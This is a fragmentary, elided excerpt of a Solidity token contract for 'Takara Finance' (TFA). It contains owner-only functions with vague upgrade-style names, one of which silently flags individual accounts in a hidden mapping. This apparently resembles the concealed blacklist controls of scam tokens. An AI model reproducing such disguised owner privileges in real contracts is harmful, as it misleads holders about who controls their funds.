...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Takara Finance';
    string constant public symbol = 'TFA';
    ...
    function TakaraStatusPayment(address account) public onlyOwner {
    ...
    function TakaraFinanceUpgrade(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function UpgradePayableTakara(address account) public view returns (bool) {
...
contract TakaraFinanceContract is BaseToken {
